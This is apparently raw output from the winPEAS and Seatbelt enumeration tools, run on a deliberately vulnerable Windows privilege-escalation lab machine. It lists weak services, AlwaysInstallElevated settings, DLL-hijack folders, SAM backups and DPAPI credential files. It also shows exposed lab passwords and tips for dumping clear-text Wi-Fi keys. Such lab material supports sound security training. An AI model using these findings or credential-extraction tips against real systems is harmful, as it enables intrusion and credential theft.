   [?] Check for some passwords or keys in the env variables 
    COMPUTERNAME: WIN-QBA94KB3IOF
    USERPROFILE: C:\Users\user
    HOMEPATH: \Users\user
    LOCALAPPDATA: C:\Users\user\AppData\Local
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp;C:\Users\user\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LOGONSERVER: \\WIN-QBA94KB3IOF
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    HOMEDRIVE: C:
    SystemRoot: C:\Windows
    SESSIONNAME: RDP-Tcp#0
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    APPDATA: C:\Users\user\AppData\Roaming
    PROCESSOR_REVISION: 4f01
    USERNAME: user
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    CLIENTNAME: userdragon
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: WIN-QBA94KB3IOF
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Users\user\AppData\Local\Temp\2
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 1
    TMP: C:\Users\user\AppData\Local\Temp\2
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: WIN-QBA94KB3IOF
    PUBLIC: C:\Users\Public

  [+] System Environment Variables()
   [?] Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 1
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

  [+] HKCU Internet Settings(T1012)
    DisableCachingOfSSLPages: 1
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 1
    EnableNegotiate: 1
    MigrateProxy: 1
    ProxyEnable: 0

  [+] HKLM Internet Settings(T1012)
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

  [+] Drives Information(T1120)
   [?] Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 29 GB)(Permissions: Users [AppendData/CreateDirectories])

  [+] AV Information(T1063)
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

  [+] UAC Status(T1012)
   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 1.
      [+] Any local account can be used for lateral movement.


  ===========================================(Users Information)===========================================

  [+] Users(T1087&T1069&T1033)
   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
  Current user: user
  Current groups: Domain Users, Everyone, Users, Builtin\Remote Desktop Users, Remote Interactive Logon, Interactive, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
   =================================================================================================

    WIN-QBA94KB3IOF\admin
        |->Groups: Administrators,Users
        |->Password: CanChange-Expi-Req

    WIN-QBA94KB3IOF\Administrator(Disabled): Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    WIN-QBA94KB3IOF\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    WIN-QBA94KB3IOF\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    WIN-QBA94KB3IOF\user
        |->Groups: Users
        |->Password: CanChange-Expi-Req

    WIN-QBA94KB3IOF\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-Expi-Req


  [+] Current Token privileges(T1134)
   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

  [+] Clipboard text(T1134)
    Not Found
    [i]     This C# implementation to capture the clipboard is not trustable in every Windows version
    [i]     If you want to see what is inside the clipboard execute 'powershell -command "Get - Clipboard"'

  [+] Logged users(T1087&T1033)
    WIN-QBA94KB3IOF\admin
    WIN-QBA94KB3IOF\user

  [+] RDP Sessions(T1087&T1033)
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    2         RDP-Tcp#0      user           WIN-QBA94KB3IOF          Active    10.9.132.165

  [+] Ever logged users(T1087&T1033)
    WIN-QBA94KB3IOF\Administrator
    WIN-QBA94KB3IOF\admin
    WIN-QBA94KB3IOF\user

  [+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultUserName               :  admin

  [+] Home folders found(T1087&T1083&T1033)
    C:\Users\admin
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [WriteData/CreateFiles]
    C:\Users\user

  [+] Password Policies(T1201)
   [?] Check for a possible brute-force 
  [X] Exception: System.OverflowException: Negating the minimum value of a twos complement number is invalid.
   at System.TimeSpan.op_UnaryNegation(TimeSpan t)
   at d7.d()
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================



  =======================================(Processes Information)=======================================

  [+] Interesting Processes -non Microsoft-(T1010&T1057&T1007)
   [?] Check if any interesting proccesses for memmory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
    winPEASany(5052)[C:\PrivEsc\winPEASany.exe] -- POwn: user -- isDotNet
    Possible DLL Hijacking folder: C:\PrivEsc (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: winPEASany.exe
   =================================================================================================

    taskhostw(2748)[C:\Windows\system32\taskhostw.exe] -- POwn: user
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================

    taskhostw(5108)[C:\Windows\system32\taskhostw.exe] -- POwn: user
    Command Line: taskhostw.exe Install $(Arg0)
   =================================================================================================

    cmd(3888)[C:\Windows\SYSTEM32\cmd.exe] -- POwn: user
    Command Line: cmd
   =================================================================================================

    smartscreen(2900)[C:\Windows\System32\smartscreen.exe] -- POwn: user
    Command Line: C:\Windows\System32\smartscreen.exe -Embedding
   =================================================================================================

    conhost(4264)[C:\Windows\system32\conhost.exe] -- POwn: user
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    RuntimeBroker(3604)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: user
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    ShellExperienceHost(3852)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: user
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================

    svchost(2260)[C:\Windows\system32\svchost.exe] -- POwn: user
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    RuntimeBroker(4028)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: user
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    rdpclip(3028)[C:\Windows\System32\rdpclip.exe] -- POwn: user
    Command Line: rdpclip
   =================================================================================================

    reverse(3224)[C:\PrivEsc\reverse.exe] -- POwn: user
    Possible DLL Hijacking folder: C:\PrivEsc (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Command Line: "C:\PrivEsc\reverse.exe" 
   =================================================================================================

    sihost(2716)[C:\Windows\system32\sihost.exe] -- POwn: user
    Command Line: sihost.exe
   =================================================================================================

    dllhost(4788)[C:\Windows\system32\DllHost.exe] -- POwn: user
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
   =================================================================================================

    SearchUI(3972)[C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe] -- POwn: user
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
   =================================================================================================

    explorer(3440)[C:\Windows\Explorer.EXE] -- POwn: user
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================

    RuntimeBroker(3168)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: user
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================



  ========================================(Services Information)========================================

  [+] Interesting Services -non Microsoft-(T1007)
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent
   =================================================================================================

    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent
   =================================================================================================

    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
   =================================================================================================

    dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Stopped
   =================================================================================================

    filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]
   =================================================================================================

    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
   =================================================================================================

    regsvc(Insecure Registry Service)["C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"] - Manual - Stopped
   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
   =================================================================================================

    winexesvc(winexesvc)[winexesvc.exe] - Manual - Stopped
   =================================================================================================


  [+] Modifiable Services(T1007)
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles

  [+] Looking if you can modify any service registry()
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])

  [+] Checking write permissions in PATH folders (DLL Hijacking)()
   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps
    
    (DLL Hijacking) C:\Temp: Users [AppendData/CreateDirectories WriteData/CreateFiles]


  ====================================(Applications Information)====================================

  [+] Current Active Window Application(T1010&T1518)
    PrivEsc

  [+] Installed Applications --Via Program Files/Uninstall registry--(T1083&T1012&T1010&T1518)
   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
    C:\Program Files\Amazon
    C:\Program Files\Autorun Program
    C:\Program Files\Common Files
    C:\Program Files\DACL Service
    C:\Program Files\desktop.ini
    C:\Program Files\DLL Hijack Service
    C:\Program Files\File Permissions Service
    C:\Program Files\Insecure Registry Service
    C:\Program Files\internet explorer
    C:\Program Files\Uninstall Information
    C:\Program Files\Unquoted Path Service(Users [AllAccess])
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


  [+] Autorun Applications(T1010)
   [?] Check if you can modify other users AutoRuns binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
    Folder: C:\Windows\system32
    File: C:\Windows\system32\SecurityHealthSystray.exe
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   =================================================================================================

    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   =================================================================================================

System.Collections.Generic.KeyNotFoundException: The given key was not present in the dictionary.
   at System.ThrowHelper.ThrowKeyNotFoundException()
   at System.Collections.Generic.Dictionary`2.get_Item(TKey key)
   at d4.ap()

  [+] Scheduled Applications --Non Microsoft--(T1010)
   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
System.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233' or one of its dependencies. The system cannot find the file specified.
File name: 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233'
   at dx.a()
   at d4.ao()

WRN: Assembly binding logging is turned OFF.
To enable assembly bind failure logging, set the registry value [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) to 1.
Note: There is some performance penalty associated with assembly bind failure logging.
To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fusion!EnableLog].



  =========================================(Network Information)=========================================

  [+] Network Shares(T1135)
  [X] Exception: System.Runtime.InteropServices.COMException (0x80070006): The handle is invalid. (Exception from HRESULT: 0x80070006 (E_HANDLE))
   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)
   at System.Runtime.InteropServices.Marshal.FreeHGlobal(IntPtr hglobal)
   at winPEAS.SamServer.c.d(Boolean A_0)
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

  [+] Host File(T1016)

  [+] Network Ifaces and known hosts(T1016)
   [?] The masks are only for the IPv4 addresses 
    Ethernet[02:13:C4:A0:E7:85]: 10.10.66.72, fe80::10c6:6ce9:8db6:83b4%15 / 255.255.0.0
        Gateways: 10.10.0.1
        DNSs: 10.0.0.2
        Known hosts:
          10.10.0.1             02-C8-85-B5-5A-AA     Dynamic
          10.10.255.255         FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


  [+] Current Listening Ports(T1049&T1049)
   [?] Check for services restricted from the outside 
    Proto     Local Address          Foreing Address        State
    TCP       0.0.0.0:135                                   Listening
    TCP       0.0.0.0:445                                   Listening
    TCP       0.0.0.0:3389                                  Listening
    TCP       0.0.0.0:5985                                  Listening
    TCP       0.0.0.0:47001                                 Listening
    TCP       0.0.0.0:49664                                 Listening
    TCP       0.0.0.0:49665                                 Listening
    TCP       0.0.0.0:49666                                 Listening
    TCP       0.0.0.0:49667                                 Listening
    TCP       0.0.0.0:49668                                 Listening
    TCP       0.0.0.0:49669                                 Listening
    TCP       0.0.0.0:49671                                 Listening
    TCP       10.10.66.72:139                               Listening
    TCP       [::]:135                                      Listening
    TCP       [::]:445                                      Listening
    TCP       [::]:3389                                     Listening
    TCP       [::]:5985                                     Listening
    TCP       [::]:47001                                    Listening
    TCP       [::]:49664                                    Listening
    TCP       [::]:49665                                    Listening
    TCP       [::]:49666                                    Listening
    TCP       [::]:49667                                    Listening
    TCP       [::]:49668                                    Listening
    TCP       [::]:49669                                    Listening
    TCP       [::]:49671                                    Listening
    UDP       0.0.0.0:123                                   Listening
    UDP       0.0.0.0:500                                   Listening
    UDP       0.0.0.0:3389                                  Listening
    UDP       0.0.0.0:4500                                  Listening
    UDP       0.0.0.0:5353                                  Listening
    UDP       0.0.0.0:5355                                  Listening
    UDP       10.10.66.72:137                               Listening
    UDP       10.10.66.72:138                               Listening
    UDP       127.0.0.1:53355                               Listening
    UDP       [::]:123                                      Listening
    UDP       [::]:500                                      Listening

  [+] Firewall Rules(T1016)
   [?] Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    False
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

  [+] DNS cached --limit 70--(T1016)
    Entry                                 Name                                  Data
    sls.update.microsoft.com              sls.update.microsoft.com              ....update.microsoft.com.akadns.net
    sls.update.microsoft.com              ....update.microsoft.com.akadns.net   ....update.microsoft.com.akadns.net
    sls.update.microsoft.com              ....update.microsoft.com.akadns.net   13.74.179.117


  =========================================(Windows Credentials)=========================================

  [+] Checking Windows Vault()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
  [X] Exception: Object reference not set to an instance of an object.
    Not Found

  [+] Checking Credential manager()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    This function is not yet implemented.
    [i] If you want to list credentials inside Credential Manager use 'cmdkey /list'

  [+] Saved RDP connections()
    Not Found

  [+] Recently run commands()
    Not Found

  [+] Checking for DPAPI Master Keys()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-3025105784-3259396213-1915610826-1000\ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed: 6/5/2020 8:38:04 AM
    Modified: 6/5/2020 8:38:04 AM
   =================================================================================================


  [+] Checking for Credential Files()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\user\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed: 6/5/2020 8:38:04 AM
    Modified: 6/5/2020 8:38:04 AM
    Size: 11152
   =================================================================================================

    CredFile: C:\Users\user\AppData\Roaming\Microsoft\Credentials\B7F3DB5C32DA09A1DE92D276CFACAC3B
    Description: Enterprise Credential Data
    MasterKey: ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed: 6/5/2020 8:38:10 AM
    Modified: 6/5/2020 8:38:10 AM
    Size: 506
   =================================================================================================

    [i] Follow the provided link for further instructions in how to decrypt the creds file

  [+] Checking for RDCMan Settings Files()
   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

  [+] Looking for kerberos tickets()
   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

  [+] Looking saved Wifis()
    This function is not yet implemented.
    [i] If you want to list saved Wifis connections you can list the using 'netsh wlan show profile'
    [i] If you want to get the clear-text password use 'netsh wlan show profile <SSID> key=clear'

  [+] Looking AppCmd.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    Not Found

  [+] Looking SSClient.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
    Not Found

  [+] Checking AlwaysInstallElevated(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

  [+] Checking WSUS(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found


  ========================================(Browsers Information)========================================

  [+] Looking for Firefox DBs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Firefox history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for Chrome DBs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Chrome history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Chrome bookmarks(T1217)
    Not Found

  [+] Current IE tabs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in IE history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history

  [+] IE favorites(T1217)
    http://go.microsoft.com/fwlink/p/?LinkId=255142


  ==============================(Interesting files and registry)==============================

  [+] Putty Sessions()
    SessionName: BWP123F42
    ProxyPassword: password123
    ProxyUsername: admin
   =================================================================================================


  [+] Putty SSH Host keys()
    Not Found

  [+] SSH keys in registry()
   [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry
    Not Found

  [+] Cloud Credentials(T1538&T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

  [+] Unnattend Files()
    C:\Windows\Panther\Unattend.xml
<Password>                    <Value>cGFzc3dvcmQxMjM=</Value>                    <PlainText>false</PlainText>                </Password>

  [+] Looking for common SAM & SYSTEM backups()
    C:\Windows\repair\SAM
    C:\Windows\repair\SYSTEM

  [+] Looking for McAfee Sitelist.xml Files()

  [+] Cached GPP Passwords()
  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.

  [+] Looking for possible regs with creds(T1012&T1214)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

  [+] Looking for possible password files in users homes(T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

  [+] Looking inside the Recycle Bin for creds files(T1083&T1081&T1145)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

  [+] Searching known files that can contain creds in home(T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files

  [+] Looking for documents --limit 100--(T1083)
    Not Found

  [+] Recent files --limit 70--(T1083&T1081)
    Not Found
```

### Seatbelt.exe
```
C:\PrivEsc>Seatbelt.exe
Seatbelt.exe


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


 "SeatBelt.exe system" collects the following system data:

	BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)
	RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13
	TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)
	UACSystemPolicies     -   UAC system policies via the registry
	PowerShellSettings    -   PowerShell versions and security settings
	AuditSettings         -   Audit settings via the registry
	WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry
	LSASettings           -   LSA settings (including auth packages)
	UserEnvVariables      -   Current user environment variables
	SystemEnvVariables    -   Current system environment variables
	UserFolders           -   Folders in C:\Users\
	NonstandardServices   -   Services with file info company names that don't contain 'Microsoft'
	InternetSettings      -   Internet settings including proxy configs
	LapsSettings          -   LAPS settings, if installed
	LocalGroupMembers     -   Members of local admins, RDP, and DCOM
	MappedDrives          -   Mapped drives
	RDPSessions           -   Current incoming RDP sessions
	WMIMappedDrives       -   Mapped drives via WMI
	NetworkShares         -   Network shares
	FirewallRules         -   Deny firewall rules, "full" dumps all
	AntiVirusWMI          -   Registered antivirus (via WMI)
	InterestingProcesses  -   "Interesting" processes- defensive products and admin tools
	RegistryAutoRuns      -   Registry autoruns
	RegistryAutoLogon     -   Registry autologon information
	DNSCache              -   DNS cache entries (via WMI)
	ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)
	AllTcpConnections     -   Lists current TCP connections and associated processes
	AllUdpConnections     -   Lists current UDP connections and associated processes
	NonstandardProcesses  -   Running processeswith file info company names that don't contain 'Microsoft'
	 *  If the user is in high integrity, the following additional actions are run:
	SysmonConfig          -   Sysmon configuration from the registry


 "SeatBelt.exe user" collects the following user data:

	SavedRDPConnections   -   Saved RDP connections
	TriageIE              -   Internet Explorer bookmarks and history  (last 7 days)
	DumpVault             -   Dump saved credentials in Windows Vault (i.e. logins from Internet Explorer and Edge), from SharpWeb
	RecentRunCommands     -   Recent "run" commands
	PuttySessions         -   Interesting settings from any saved Putty configurations
	PuttySSHHostKeys      -   Saved putty SSH host keys
	CloudCreds            -   AWS/Google/Azure cloud credential files
	RecentFiles           -   Parsed "recent files" shortcuts  (last 7 days)
	MasterKeys            -   List DPAPI master keys
	CredFiles             -   List Windows credential DPAPI blobs
	RDCManFiles           -   List Windows Remote Desktop Connection Manager settings files
	 *  If the user is in high integrity, this data is collected for ALL users instead of just the current user


 Non-default options:

	CurrentDomainGroups   -   The current user's local and domain groups
	Patches               -   Installed patches via WMI (takes a bit on some systems)
	LogonSessions         -   User logon session data
	KerberosTGTData       -   ALL TEH TGTZ!
	InterestingFiles      -   "Interesting" files matching various patterns in the user's folder
	IETabs                -   Open Internet Explorer tabs
	TriageChrome          -   Chrome bookmarks and history
	TriageFirefox         -   Firefox history (no bookmarks)
	RecycleBin            -   Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
	4624Events            -   4624 logon events from the security event log
	4648Events            -   4648 explicit logon events from the security event log (runas or outbound RDP)
	KerberosTickets       -   List Kerberos tickets. If elevated, grouped by all logon sessions.


 "SeatBelt.exe all" will run ALL enumeration checks, can be combined with "full".


 "SeatBelt.exe [CheckName] full" will prevent any filtering and will return complete results.


 "SeatBelt.exe [CheckName] [CheckName2] ..." will run one or more specified checks only (case-sensitive naming!)


C:\PrivEsc>Seatbelt.exe system
Seatbelt.exe system


